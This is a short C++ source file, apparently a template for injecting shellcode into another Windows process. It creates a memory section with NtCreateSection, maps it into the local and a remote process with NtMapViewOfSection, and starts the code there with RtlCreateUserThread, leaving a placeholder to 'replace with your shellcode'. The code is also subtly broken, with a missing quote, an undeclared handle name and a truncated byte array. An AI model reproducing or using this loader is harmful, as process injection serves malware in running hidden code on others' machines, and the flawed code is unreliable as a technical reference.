#include <iostream>
#include <Windows.h>

typedef struct _OBJECT_ATTRIBUTES {	ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI *myNtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI *myNtMapViewOfSection)(HANDLE SectionHandle,HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef FARPROC (WINAPI * myRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

int main(){
	
	char shellcode[] = {0x45,0x54,0x2b...,0x0}; //replace with your shellcode
	
	myNtCreateSection NtCreateSection = (myNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtCreateSection);
	myNtMapViewOfSection NtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtMapViewOfSection");
	
	HANDLE section;
	
	NTSTATUS success_section = NtCreateSection(&section,SECTION_ALL_ACCESS,NULL,(PLARGE_INTEGER)&(sizeof(shellcode)),PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
	
	PVOID base_addr = NULL;
	NTSTATUS success_view = NtMapViewOfSection(section,GetCurrentProcess(),&base_addr,NULL,NULL,NULL,(SIZE_T*)&(sizeof(shellcode)),ViewUnmap,NULL,PAGE_READWRITE);
	
	memcpy(base_addr,shellcode,sizeof(shellcode));
	
	HANDLE remote_proc = OpenProcess(PROCESS_ALL_ACCESS,NULL,1234);
	NTSTATUS success_remote = NtMapViewOfSection(section,remote_proc,&base_addr,NULL,NULL,NULL,(SIZE_T*)&(sizeof(shellcode)),ViewUnmap,NULL,PAGE_EXECUTE_READ);
	
	HANDLE thread = NULL;
	CLIENT_ID cid;
	myRtlCreateUserThread RtlCreateUserThread = (myRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlCreateUserThread");
	RtlCreateUserThread(remote_proc, NULL, FALSE, 0, 0, 0, base_addr, 0, &hThread, &cid);
	if (thread != NULL) {
			WaitForSingleObject(thread, 500);
			CloseHandle(thread);
			return 0;
	}
	
	
}